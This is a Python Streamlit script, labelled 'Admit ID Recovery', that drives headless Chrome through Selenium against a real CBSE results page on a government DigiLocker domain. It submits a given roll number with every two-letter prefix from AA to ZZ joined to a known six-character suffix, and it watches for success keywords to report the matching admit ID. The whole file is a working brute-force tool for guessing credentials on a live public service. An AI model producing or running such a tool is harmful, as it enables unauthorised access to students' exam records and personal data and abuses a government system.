import streamlit as st
import os
import time
import string
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException

# ========================= CONFIGURATION =========================
URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"

def get_driver():
    """Sets up a lean, headless Chrome instance for Render."""
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    options.add_argument("--window-size=1280,720")
    options.add_argument("--blink-settings=imagesEnabled=false")
    
    render_bin = "/opt/render/project/src/.render/chrome/opt/google/chrome/google-chrome"
    if os.path.exists(render_bin):
        options.binary_location = render_bin
        
    return webdriver.Chrome(options=options)

def is_success(driver):
    """
    STRICT LOGIC RE-CHECK:
    1. If 'No data found' is visible -> Return False
    2. If success keywords appear in page source -> Return True
    3. If URL changes to a result route -> Return True
    """
    try:
        # Check for the error message div
        error_elements = driver.find_elements(By.ID, "err_msg")
        if error_elements:
            error_elem = error_elements[0]
            # If it's displayed AND specifically contains the failure text
            if error_elem.is_displayed() and "no data found" in error_elem.text.lower():
                return False
        
        # If we got past the error check, look for keywords in the page source
        page_text = driver.page_source.lower()
        success_indicators = ["marks", "result", "subject", "grade", "total", "pass", "percentage"]
        
        if any(ind in page_text for ind in success_indicators):
            return True
            
        # Check for URL change (Result pages usually lose the .html suffix or gain /result/)
        curr_url = driver.current_url.lower()
        if "result" in curr_url and "error" not in curr_url and ".html" not in curr_url:
            return True
            
    except Exception:
        pass
    
    return False

# ========================= STREAMLIT UI =========================
st.set_page_config(page_title="Admit ID Recovery", page_icon="🎓")

st.markdown("""
    <style>
    .stButton>button { width: 100%; border-radius: 5px; height: 3em; background-color: #ff4b4b; color: white; }
    </style>
    """, unsafe_allow_html=True)

st.title("🎓 CBSE 12th Admit ID Recovery")

col1, col2 = st.columns(2)
with col1:
    roll_val = st.text_input("Roll Number", value="18615899")
with col2:
    suffix_val = st.text_input("Last 6 Characters", value="994511")

delay_val = st.slider("Wait for page response (Seconds)", 0.5, 4.0, 1.2)

if st.button("🚀 Start Brute Force"):
    progress_bar = st.progress(0)
    
    driver = None
    try:
        driver = get_driver()
        letters = string.ascii_uppercase
        combos = [f"{a}{b}" for a in letters for b in letters]
        total = len(combos)
        
        with st.status("Brute forcing...", expanded=True) as status:
            for i, prefix in enumerate(combos):
                code = f"{prefix}{suffix_val}"
                status.update(label=f"Testing: **{code}** ({i+1}/{total})")
                progress_bar.progress((i + 1) / total)
                
                # 1. HARD REFRESH: Opens page fresh for every attempt
                driver.get(URL)
                time.sleep(0.5) 
                
                try:
                    # 2. FILL FIELDS
                    driver.find_element(By.ID, "rroll").send_keys(roll_val)
                    driver.find_element(By.ID, "admn_id").send_keys(code)
                    
                    # 3. SUBMIT
                    driver.find_element(By.ID, "submit").click()
                    
                    # 4. WAIT for the site's server-side logic to trigger
                    time.sleep(delay_val)
                    
                    # 5. EXECUTE SUCCESS LOGIC
                    if is_success(driver):
                        status.update(label="✅ Success!", state="complete")
                        st.balloons()
                        st.success(f"### 🎉 Match Found!\n**Admit ID:** `{code}`")
                        st.code(code)
                        break
                        
                except Exception:
                    continue 
            else:
                status.update(label="❌ Not Found", state="error")
                st.warning("Finished all combinations without a match.")

    except Exception as e:
        st.error(f"Error: {e}")
    finally:
        if driver:
            driver.quit()
